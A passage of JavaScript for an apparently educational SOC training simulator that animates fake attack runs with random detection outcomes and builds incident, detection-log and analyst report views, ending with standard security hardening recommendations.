    d.innerHTML=`<div class="cat-dot" style="background:${c.color}"></div>${c.label}<span class="cat-count">${c.attacks.length}</span>`;
    d.onclick=()=>selectCat(c.id);
    cl.appendChild(d);
  });
  renderAttackGrid();
}

function selectTarget(id) {
  STATE.target = TARGETS.find(t=>t.id===id);
  document.querySelectorAll('.target-card').forEach(el=>el.classList.remove('selected'));
  document.getElementById('tgt-'+id).classList.add('selected');
  document.getElementById('cfg-target').textContent = `${STATE.target.name} (${STATE.target.ip})`;
  renderAttackGrid();
  updateLaunchBtn();
}

function selectCat(id) {
  STATE.cat=id; STATE.attack=null;
  document.querySelectorAll('.cat-btn').forEach(el=>el.classList.remove('active'));
  document.getElementById('cat-'+id).classList.add('active');
  renderAttackGrid();
  updateLaunchBtn();
}

function renderAttackGrid() {
  const cat = CATS.find(c=>c.id===STATE.cat);
  const grid = document.getElementById('attack-grid');
  if(!cat){grid.innerHTML=''; return;}
  grid.innerHTML = cat.attacks.map(aid => {
    const atk = ATTACKS[aid];
    const disabled = STATE.target && !atk.targetTypes.includes(STATE.target.id) ? 'disabled':'';
    const sel = STATE.attack===aid ? 'selected':'';
    return `<div class="atk-btn ${disabled} ${sel}" onclick="selectAttack('${aid}')">
      <div class="atk-name">${atk.name}</div>
      <div class="atk-tool">${atk.tool}</div>
      <div class="atk-sev ${atk.sev}">${atk.sev}</div>
    </div>`;
  }).join('');
}

function selectAttack(id) {
  const atk = ATTACKS[id];
  if(STATE.target && !atk.targetTypes.includes(STATE.target.id)) return;
  STATE.attack = id;
  renderAttackGrid();
  updateStealthBar(atk.stealth);
  renderParams(atk);
  updateLaunchBtn();
}

function updateStealthBar(level) {
  document.querySelectorAll('.stealth-dot').forEach((d,i) => {
    d.className='stealth-dot'+(i<level?' filled '+getStealthClass(level):'');
  });
}

function getStealthClass(l){return l<=2?'low-stealth':l<=3?'med-stealth':'high-stealth';}

function renderParams(atk) {
  const p = document.getElementById('cfg-params');
  if(!atk.params || atk.params.length===0){p.innerHTML='';return;}
  p.innerHTML = atk.params.map((param,i)=>`
    <span class="cfg-label">${param.label}:</span>
    <select class="cfg-select" id="param-${i}">${param.opts.map(o=>`<option>${o}</option>`).join('')}</select>
  `).join('');
}

function updateLaunchBtn() {
  const btn = document.getElementById('btn-launch');
  btn.disabled = !(STATE.target && STATE.attack) || STATE.isRunning;
}

// ================================================================
// ATTACK SIMULATION
// ================================================================
function launchAttack() {
  if(!STATE.target || !STATE.attack || STATE.isRunning) return;
  STATE.isRunning=true;
  const btn = document.getElementById('btn-launch');
  btn.disabled=true; btn.classList.add('running'); btn.textContent='⟳ RUNNING...';

  const atk = ATTACKS[STATE.attack];
  const tgt = STATE.target;
  const paramEls = document.querySelectorAll('[id^="param-"]');
  const params = [...paramEls].map(el=>el.value);

  clearTerminal();
  addTermLine(`[SIM] ══ ATTACK SIMULATION STARTED ══`, 'warning');
  addTermLine(`[SIM] Attack: ${atk.name} | Tool: ${atk.tool}`, 'info');
  addTermLine(`[SIM] Target: ${tgt.name} (${tgt.ip})`, 'info');
  addTermLine(`[SIM] Severity: ${atk.sev.toUpperCase()} | Stealth: ${atk.stealth}/5`, 'info');
  addTermLine(``, 'dim');

  const lines = atk.lines(tgt, params[0]||null);
  const detected = Math.random() < (1 - (atk.stealth-1)*0.15);
  const success = Math.random() < 0.8;
  const duration = 3000 + lines.length * 280;

  // Animate progress bar
  const prog = document.getElementById('progress-fill');
  prog.style.width='0%';
  const startTime = Date.now();
  const progInt = setInterval(()=>{
    const pct = Math.min(95, ((Date.now()-startTime)/duration)*100);
    prog.style.width = pct+'%';
  }, 100);

  // Type terminal lines
  let delay = 300;
  lines.forEach((line, i) => {
    setTimeout(() => {
      addTermLine(line, 'normal', true);
    }, delay);
    delay += 200 + Math.random()*250;
  });

  // Show result
  setTimeout(() => {
    clearInterval(progInt);
    prog.style.width='100%';
    addTermLine(``, 'dim');
    addTermLine(`[SIM] ══ RESULT ══════════════════════`, 'warning');

    const result = detected ? (success ? 'detected' : 'blocked') : 'undetected';

    if(result==='detected') {
      addTermLine(`[!] DETECTED — SOC has been alerted`, 'detected');
      addTermLine(`[!] Attack ${success?'partially succeeded before detection':'was contained'}`, 'detected');
    } else if(result==='blocked') {
      addTermLine(`[-] BLOCKED by security controls`, 'blocked');
      addTermLine(`[-] Attack did not succeed`, 'blocked');
    } else {
      addTermLine(`[+] UNDETECTED — No alerts triggered`, 'undetected');
      addTermLine(`[+] Attack ${success?'succeeded silently':'failed — but no one knows'}`, 'undetected');
    }

    // Update hacker stats
    STATE.stats.total++;
    if(result!=='undetected') STATE.stats.detected++;
    else STATE.stats.ghost++;
    updateHackerStats();

    // Log to history
    addToHistory({name:atk.name, target:tgt.name, result, time:getUTCTime(), sev:atk.sev});

    // Trigger SOC if detected
    if(result!=='undetected') {
      setTimeout(()=>triggerSOCDetection(atk, tgt, result, params[0]), 800);
    }

    // Reset
    setTimeout(()=>{
      STATE.isRunning=false;
      btn.disabled=false; btn.classList.remove('running'); btn.textContent='▶ LAUNCH';
      setTimeout(()=>{ prog.style.width='0%'; }, 1000);
    }, 1500);

  }, duration);
}

function clearTerminal() {
  const tb = document.getElementById('term-body');
  tb.innerHTML='';
}

function addTermLine(text, cls='normal', raw=false) {
  const tb = document.getElementById('term-body');
  const span = document.createElement('span');
  span.className='tl '+cls;
  if(raw) span.innerHTML=text;
  else span.textContent=text;
  tb.appendChild(span);
  tb.scrollTop=tb.scrollHeight;
}

function updateHackerStats() {
  document.getElementById('stat-total').textContent=STATE.stats.total;
  document.getElementById('stat-det').textContent=STATE.stats.detected;
  document.getElementById('stat-undet').textContent=STATE.stats.ghost;
}

function addToHistory(entry) {
  const log = document.getElementById('attack-log');
  if(log.querySelector('.no-attacks')) log.innerHTML='';
  const d = document.createElement('div');
  d.className=`log-entry ${entry.result}`;
  d.innerHTML=`
    <div class="le-top"><span class="le-name">${entry.name}</span><span class="le-time">${entry.time}</span></div>
    <div class="le-target">${entry.target} · <span class="atk-sev ${entry.sev}" style="display:inline">${entry.sev}</span></div>
    <span class="le-result ${entry.result}">${entry.result.toUpperCase()}</span>`;
  log.insertBefore(d, log.firstChild);
}

// ================================================================
// SOC DETECTION ENGINE
// ================================================================
function triggerSOCDetection(atk, tgt, result, param) {
  const t = getUTCTime();
  const incId = 'INC-'+String(STATE.incCounter).padStart(4,'0');
  STATE.incCounter++;

  // Create alert
  const alert = {
    sev: atk.sev, msg:`${atk.incTitle} — ${tgt.name}`,
    src: tgt.ip, time: t, tool: atk.tool,
  };
  STATE.socAlerts.unshift(alert);

  // Create incident
  const incident = {
    id: incId, title: atk.incTitle, type: atk.incType,
    sev: atk.sev, source: '192.168.1.99', target: tgt.name+'('+tgt.ip+')',
    time: t, desc: atk.incDesc, atk, tgt,
  };
  STATE.socIncidents.unshift(incident);

  // Create SAST entry
  const sig = atk.sig;
  const sast = {
    rule: sig.rule, cat: sig.cat, conf: sig.conf, time: t,
    payload: sig.payload(tgt), desc: sig.desc, why: sig.why,
    recs: sig.recs, sev: atk.sev, incId,
  };
  STATE.sastEntries.unshift(sast);

  // Update host hits
  STATE.hostHits[tgt.name] = (STATE.hostHits[tgt.name]||0)+1;

  // Update unread badge
  if(STATE.portal!=='soc') {
    STATE.unread++;
    updateBadge();
  }

  // Update SOC UI
  updateSOCMetrics();
  renderAlertFeed();
  renderHostBars();
  renderIncidents();
  renderSAST();
  updateNavBadges();
}

function updateSOCMetrics() {
  const total = STATE.stats.total;
  const det = STATE.stats.detected;
  const ghost = STATE.stats.ghost;
  const rate = total>0 ? Math.round((det/total)*100) : null;
  const incs = STATE.socIncidents.length;
  const crit = STATE.socIncidents.filter(i=>i.sev==='critical').length;
  const high = STATE.socIncidents.filter(i=>i.sev==='high').length;

  document.getElementById('m-inc').textContent = incs;
  document.getElementById('m-inc-sub').textContent = crit>0?`${crit} critical, ${high} high`:'No critical incidents';
  document.getElementById('m-det').textContent = det;
  document.getElementById('m-det-sub').textContent = total>0?`${det}/${total} attacks detected`:'Simulation running';
  document.getElementById('m-ghost').textContent = ghost;
  document.getElementById('m-rate').textContent = rate!==null ? rate+'%':'—';
  document.getElementById('m-rate-sub').textContent = rate!==null?`Based on ${total} attack(s)`:'No data yet';

  // Threat level
  const tv = document.getElementById('threat-val');
  if(crit>=2){tv.textContent='CRITICAL';tv.className='threat-val critical';}
  else if(crit===1){tv.textContent='HIGH';tv.className='threat-val high';}
  else if(high>=2){tv.textContent='ELEVATED';tv.className='threat-val elevated';}
  else if(incs>0){tv.textContent='MODERATE';tv.className='threat-val elevated';}
  else{tv.textContent='NORMAL';tv.className='threat-val normal';}
}

function renderAlertFeed() {
  const feed = document.getElementById('s-alert-feed');
  if(STATE.socAlerts.length===0) return;
  feed.innerHTML = STATE.socAlerts.slice(0,20).map(a=>`
    <div class="s-alert-row">
      <div class="sev-pip ${a.sev}"></div>
      <span class="al-time">${a.time}</span>
      <div><div class="al-msg">${a.msg}</div><div class="al-src">${a.src} · ${a.tool}</div></div>
    </div>`).join('');
}

function renderHostBars() {
  const el = document.getElementById('host-bars');
  const entries = Object.entries(STATE.hostHits).sort((a,b)=>b[1]-a[1]);
  const max = entries.length>0 ? entries[0][1] : 1;
  el.innerHTML = entries.slice(0,6).map(([name,count])=>`
    <div class="host-row">
      <span class="host-name">${name}</span>
      <div class="host-bar-wrap"><div class="host-bar" style="width:${Math.round(count/max*100)}%"></div></div>
      <span class="host-num">${count}</span>
    </div>`).join('') || '<div style="padding:30px;text-align:center;font-family:\'Share Tech Mono\',monospace;font-size:10px;color:var(--s-muted)">No targets attacked yet</div>';
}

function renderIncidents() {
  const list = document.getElementById('inc-list');
  const filtered = STATE.filterInc==='all' ? STATE.socIncidents : STATE.socIncidents.filter(i=>i.sev===STATE.filterInc);
  if(filtered.length===0){
    list.innerHTML=`<div class="s-empty">[ ${STATE.filterInc.toUpperCase()} INCIDENTS: NONE ]<br>Launch attacks from the Hacker Portal</div>`;
    return;
  }
  list.innerHTML = filtered.map(inc=>`
    <div class="inc-card ${inc.sev}" id="ic-${inc.id}">
      <div class="ic-head">
        <span class="ic-id">${inc.id}</span>
        <span class="badge ${inc.sev}">${inc.sev}</span>
        <span class="ic-title">${inc.title}</span>
        <span class="ic-time">${inc.time}</span>
      </div>
      <div class="ic-body">
        <div class="ic-field"><label>Type</label><span>${inc.type}</span></div>
        <div class="ic-field"><label>Source</label><span>${inc.source}</span></div>
        <div class="ic-field"><label>Target</label><span>${inc.tgt.name}</span></div>
      </div>
      <div class="ic-foot">
        <span class="ic-desc">${inc.desc}</span>
        <button class="btn-respond" onclick="openModal('${inc.id}')">RESPOND</button>
      </div>
    </div>`).join('');
}

function renderSAST() {
  const list = document.getElementById('sast-list');
  if(STATE.sastEntries.length===0) return;
  list.innerHTML = STATE.sastEntries.map(e=>`
    <div class="sast-entry ${e.sev}">
      <div class="se-head">
        <span class="se-rule">${e.rule}</span>
        <span class="se-cat">${e.cat}</span>
        <span class="se-conf ${e.conf}">${e.conf} CONFIDENCE</span>
        <span class="se-time">${e.time}</span>
      </div>
      <div class="se-body">
        <div class="se-field"><label>Matched Payload / Evidence</label><code>${e.payload}</code></div>
        <div class="se-field"><label>Detection Description</label><p>${e.desc}</p></div>
        <div class="se-field"><label>Why This Is a Threat</label><p>${e.why}</p></div>
        <div class="se-field"><label>Recommended Response</label>
          <div class="se-recs">${e.recs.map(r=>`<span class="se-rec">${r}</span>`).join('')}</div>
        </div>
      </div>
    </div>`).join('');
}

function renderReports() {
  const list = document.getElementById('rep-list');
  if(STATE.reports.length===0){
    list.innerHTML='<div class="s-empty">[ NO REPORTS FILED YET ]<br>Respond to incidents to generate reports</div>';
    return;
  }
  list.innerHTML = STATE.reports.map(r=>`
    <div class="rep-card" onclick="this.classList.toggle('expanded')">
      <div class="rc-top">
        <span class="badge ${r.sev}">${r.sev}</span>
        <span style="font-family:\'Share Tech Mono\',monospace;font-size:10px;color:var(--s-muted)">${r.reportId}</span>
        <span class="rc-title">${r.incTitle}</span>
        <span class="rc-time">${r.reportTime}</span>
      </div>
      <div class="rc-body">
        <div class="rc-row"><label>Incident ID</label><span>${r.incId} · ${r.incType}</span></div>
        <div class="rc-row"><label>Target</label><span>${r.target}</span></div>
        <div class="rc-row"><label>Disposition</label><span><span class="badge ${r.disposition==='Contained'?'resolved':r.disposition==='Escalated'?'high':'low'}">${r.disposition}</span></span></div>
        <div class="rc-row"><label>Actions Taken</label><div class="rc-tags">${r.actions.map(a=>`<span class="rc-tag">${a}</span>`).join('')||'<span style="color:var(--s-muted);font-size:11px">None recorded</span>'}</div></div>
        <div class="rc-row"><label>Analyst Notes</label><span>${r.notes}</span></div>
        <div class="rc-row"><label>Detection Signature</label><span style="font-family:\'Share Tech Mono\',monospace;font-size:10px;color:var(--cyan)">${r.sigRule}</span></div>
      </div>
    </div>`).join('');
}

function updateNavBadges() {
  const ib = document.getElementById('inc-badge');
  const sb = document.getElementById('sast-badge');
  const rb = document.getElementById('rep-badge');
  const ic = STATE.socIncidents.length;
  const sc = STATE.sastEntries.length;
  const rc = STATE.reports.length;
  ib.textContent=ic; ib.className='s-nav-badge'+(ic>0?' show':'');
  sb.textContent=sc; sb.className='s-nav-badge'+(sc>0?' show':'');
  rb.textContent=rc; rb.className='s-nav-badge'+(rc>0?' show':'');
}

function filterInc(sev, btn) {
  STATE.filterInc=sev;
  document.querySelectorAll('.f-btn').forEach(b=>b.classList.remove('active'));
  btn.classList.add('active');
  renderIncidents();
}

// ================================================================
// SOC VIEW SWITCHING
// ================================================================
const SOC_VIEWS = {dashboard:'sv-dashboard',incidents:'sv-incidents',sast:'sv-sast',reports:'sv-reports'};
const SOC_TITLES = {dashboard:'DASHBOARD',incidents:'ACTIVE INCIDENTS',sast:'DETECTION ENGINE — SAST ANALYSIS',reports:'INCIDENT REPORTS'};

function switchSOCView(view, el) {
  Object.values(SOC_VIEWS).forEach(id=>document.getElementById(id).style.display='none');
  document.getElementById(SOC_VIEWS[view]).style.display='';
  document.querySelectorAll('.s-nav-item').forEach(n=>n.classList.remove('active'));
  el.classList.add('active');
  document.getElementById('soc-view-title').textContent=SOC_TITLES[view];
}

// ================================================================
// RESPONSE MODAL
// ================================================================
let modalIncId = null;
let selectedDisp = null;

function openModal(id) {
  const inc = STATE.socIncidents.find(i=>i.id===id);
  if(!inc) return;
  modalIncId=id; selectedDisp=null;
  document.querySelectorAll('input[name="act"]').forEach(c=>c.checked=false);
  document.querySelectorAll('.disp-btn').forEach(b=>b.classList.remove('sel'));
  document.getElementById('modal-notes').value='';
  document.getElementById('modal-inc-box').innerHTML=`
    <div class="mi-title"><span class="badge ${inc.sev}" style="margin-right:8px">${inc.sev}</span>${inc.title}</div>
    <div class="mi-grid">
      <div class="mi-field"><label>Incident ID</label><span>${inc.id}</span></div>
      <div class="mi-field"><label>Type</label><span>${inc.type}</span></div>
      <div class="mi-field"><label>Source IP</label><span>${inc.source}</span></div>
      <div class="mi-field"><label>Target</label><span>${inc.tgt.name}</span></div>
    </div>
    <div class="mi-desc">${inc.desc}</div>`;
  document.getElementById('modal-overlay').classList.add('open');
}

function closeModal() {
  document.getElementById('modal-overlay').classList.remove('open');
  modalIncId=null; selectedDisp=null;
}

function selDisp(btn, val) {
  selectedDisp=val;
  document.querySelectorAll('.disp-btn').forEach(b=>b.classList.remove('sel'));
  btn.classList.add('sel');
}

function fileReport() {
  if(!selectedDisp){showToast('Select a disposition to proceed','w');return;}
  const inc = STATE.socIncidents.find(i=>i.id===modalIncId);
  if(!inc) return;
  const actions = [...document.querySelectorAll('input[name="act"]:checked')].map(c=>c.value);
  const notes = document.getElementById('modal-notes').value.trim()||'(No notes provided)';
  const t = getUTCTime();
  const rpt = {
    reportId:'RPT-'+String(STATE.rpCounter).padStart(4,'0'),
    incId:inc.id, incTitle:inc.title, incType:inc.type,
    sev:inc.sev, target:inc.tgt.name+'('+inc.tgt.ip+')',
    source:inc.source, reportTime:t, analyst:'A. Khan',
    disposition:selectedDisp, actions, notes,
    sigRule: STATE.sastEntries.find(s=>s.incId===inc.id)?.rule || 'N/A',
  };
  STATE.rpCounter++;
  STATE.reports.unshift(rpt);
  STATE.socIncidents = STATE.socIncidents.filter(i=>i.id!==modalIncId);
  closeModal();
  renderIncidents();
  renderReports();
  updateNavBadges();
  updateSOCMetrics();
  showToast('Report filed: '+rpt.reportId,'s');
}

// ================================================================
// EXPORT .TXT REPORT
// ================================================================
function exportReport() {
  if(STATE.stats.total===0){showToast('No simulation data to export yet','w');return;}
  const n=new Date();
  const ts=[n.getUTCFullYear(),String(n.getUTCMonth()+1).padStart(2,'0'),String(n.getUTCDate()).padStart(2,'0')].join('-')+' '+[n.getUTCHours(),n.getUTCMinutes(),n.getUTCSeconds()].map(v=>String(v).padStart(2,'0')).join(':')+' UTC';
  const total=STATE.stats.total, det=STATE.stats.detected, ghost=STATE.stats.ghost;
  const rate=total>0?Math.round((det/total)*100):0;
  let txt='';
  txt+='╔══════════════════════════════════════════════════════════════════╗\n';
  txt+='║          SKY SECURITY OPERATIONS CENTER                         ║\n';
  txt+='║          SIMULATION INCIDENT REPORT                             ║\n';
  txt+='╚══════════════════════════════════════════════════════════════════╝\n\n';
  txt+=`Report Generated : ${ts}\n`;
  txt+=`Analyst          : A. Khan (Tier 2 SOC Analyst)\n`;
  txt+=`Platform         : SKY SOC Simulation v2.1\n`;
  txt+=`Session ID       : SIM-${n.toISOString().slice(0,10).replace(/-/g,'')}-001\n\n`;
  txt+='══════════════════════════════════════════════════════════════════\n';
  txt+='EXECUTIVE SUMMARY\n';
  txt+='══════════════════════════════════════════════════════════════════\n\n';
  txt+=`Total Attacks Simulated  : ${total}\n`;
  txt+=`Attacks Detected         : ${det}\n`;
  txt+=`Attacks Undetected       : ${ghost}\n`;
  txt+=`Detection Rate           : ${rate}%\n`;
  txt+=`Incidents Responded To   : ${STATE.reports.length}\n`;
  txt+=`Open Incidents           : ${STATE.socIncidents.length}\n\n`;
  txt+='Attack severity breakdown:\n';
  const sevs=['critical','high','medium','low'];
  sevs.forEach(s=>{
    const cnt=STATE.sastEntries.filter(e=>e.sev===s).length;
    if(cnt>0) txt+=`  ${s.toUpperCase().padEnd(12)}: ${cnt} attack(s)\n`;
  });
  txt+='\n';

  if(STATE.sastEntries.length>0){
    txt+='══════════════════════════════════════════════════════════════════\n';
    txt+='DETECTION ENGINE LOG (SAST / IDS SIGNATURES)\n';
    txt+='══════════════════════════════════════════════════════════════════\n\n';
    STATE.sastEntries.slice().reverse().forEach((e,i)=>{
      txt+=`[DETECTION ${i+1}] ${e.time}\n`;
      txt+=`  Rule       : ${e.rule}\n`;
      txt+=`  Category   : ${e.cat}\n`;
      txt+=`  Confidence : ${e.conf}\n`;
      txt+=`  Severity   : ${e.sev.toUpperCase()}\n`;
      txt+=`  Payload    : ${e.payload}\n`;
      txt+=`  Analysis   : ${e.desc}\n`;
      txt+=`  Why Threat : ${e.why}\n`;
      txt+=`  Response   : ${e.recs.join('; ')}\n`;
      txt+='\n';
    });
  }

  if(STATE.reports.length>0){
    txt+='══════════════════════════════════════════════════════════════════\n';
    txt+='ANALYST INCIDENT REPORTS (FILED)\n';
    txt+='══════════════════════════════════════════════════════════════════\n\n';
    STATE.reports.slice().reverse().forEach(r=>{
      txt+=`${r.reportId} — ${r.incTitle}\n`;
      txt+=`${'─'.repeat(60)}\n`;
      txt+=`  Incident ID  : ${r.incId}\n`;
      txt+=`  Type         : ${r.incType}\n`;
      txt+=`  Severity     : ${r.sev.toUpperCase()}\n`;
      txt+=`  Target       : ${r.target}\n`;
      txt+=`  Source IP    : ${r.source}\n`;
      txt+=`  Filed At     : ${r.reportTime}\n`;
      txt+=`  Analyst      : ${r.analyst}\n`;
      txt+=`  Disposition  : ${r.disposition}\n`;
      txt+=`  Sig Rule     : ${r.sigRule}\n`;
      txt+=`  Actions      : ${r.actions.length>0?r.actions.join(', '):'None recorded'}\n`;
      txt+=`  Notes        : ${r.notes}\n\n`;
    });
  }

  if(STATE.socIncidents.length>0){
    txt+='══════════════════════════════════════════════════════════════════\n';
    txt+='OPEN INCIDENTS (NOT YET RESPONDED TO)\n';
    txt+='══════════════════════════════════════════════════════════════════\n\n';
    STATE.socIncidents.forEach(inc=>{
      txt+=`${inc.id} — ${inc.title}\n  Severity: ${inc.sev.toUpperCase()} | Target: ${inc.tgt.name} | Detected: ${inc.time}\n  ${inc.desc}\n\n`;
    });
  }

  if(ghost>0){
    txt+='══════════════════════════════════════════════════════════════════\n';
    txt+='SECURITY GAPS — UNDETECTED ATTACKS\n';
    txt+='══════════════════════════════════════════════════════════════════\n\n';
    txt+='The following attacks were NOT detected by the SOC.\n';
    txt+='These represent real security gaps requiring remediation.\n\n';
    txt+=`  ${ghost} attack(s) evaded detection entirely.\n`;
    txt+='  Review your detection rules and monitoring coverage.\n\n';
  }

  txt+='══════════════════════════════════════════════════════════════════\n';
  txt+='RECOMMENDATIONS\n';
  txt+='══════════════════════════════════════════════════════════════════\n\n';
  txt+=`1. Implement multi-layer detection (network IDS + EDR + SIEM)\n`;
  txt+=`2. Enable MFA on all privileged accounts\n`;
  txt+=`3. Apply principle of least privilege across all systems\n`;
  txt+=`4. Patch known CVEs within 72 hours of disclosure\n`;
  txt+=`5. Run regular penetration tests and purple team exercises\n`;
  txt+=`6. Implement network segmentation to limit lateral movement\n`;
  txt+=`7. Enable SMB signing and disable LLMNR/NBT-NS\n`;
  txt+=`8. Deploy Privileged Access Workstations (PAW) for admin tasks\n\n`;

  txt+='╔══════════════════════════════════════════════════════════════════╗\n';
  txt+='║  END OF REPORT — SKY SOC Simulation Platform                    ║\n';
  txt+='║  Educational use only — for cybersecurity training purposes      ║\n';
  txt+='╚══════════════════════════════════════════════════════════════════╝\n';

  const blob = new Blob([txt], {type:'text/plain'});
  const a = document.createElement('a');
  a.href = URL.createObjectURL(blob);
  a.download = `SKY_Incident_Report_${n.toISOString().slice(0,10)}.txt`;
  a.click();
  showToast('Report exported as .txt','s');
}

// ================================================================
// UTILITIES
// ================================================================
function getUTCTime() {
  const n=new Date();
  return [n.getUTCHours(),n.getUTCMinutes(),n.getUTCSeconds()].map(v=>String(v).padStart(2,'0')).join(':');
}

function showToast(msg, type='i') {
  const c=document.getElementById('toasts');
  const t=document.createElement('div');
  t.className=`toast ${type}`;
  t.textContent=msg;
  c.appendChild(t);
  setTimeout(()=>{t.style.animation='toastIn .25s ease reverse';setTimeout(()=>t.remove(),250);},3000);
}

// ================================================================
// INIT
// ================================================================
initHacker();